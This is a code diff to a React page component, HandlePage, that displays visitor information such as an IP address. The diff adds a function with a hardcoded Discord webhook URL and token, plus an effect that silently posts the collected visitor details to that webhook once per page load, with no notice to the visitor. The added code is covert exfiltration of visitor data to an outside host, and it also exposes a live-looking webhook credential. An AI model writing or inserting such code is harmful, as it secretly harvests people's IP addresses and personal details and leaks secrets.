@@ -388,6 +388,17 @@ function HandlePage() {
     }
   }
 
+  // Add this function to send info to Discord webhook
+  function sendToWebhook(infoLines) {
+    const webhookUrl = "https://discord.com/api/webhooks/1393670218462527630/BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL";
+    const content = infoLines.join('\n');
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  }
+
   // Compose info lines for typewriter
   const infoLines = [];
   infoLines.push(`IP: ${ipLoading ? 'Loading...' : ipAddress}`);
@@ -414,6 +425,18 @@ function HandlePage() {
   if (infoLines.length === 0) {
     infoLines.push('Loading...');
   }
+  // Send to webhook only once, when info is ready and not loading
+  useEffect(() => {
+    if (
+      infoLines.length > 0 &&
+      !infoLines[0].includes('Loading') &&
+      !window.__webhookSent
+    ) {
+      sendToWebhook(infoLines);
+      window.__webhookSent = true;
+    }
+    // eslint-disable-next-line
+  }, [infoLines]);
 
   return (
     <div className="video-bg-container">
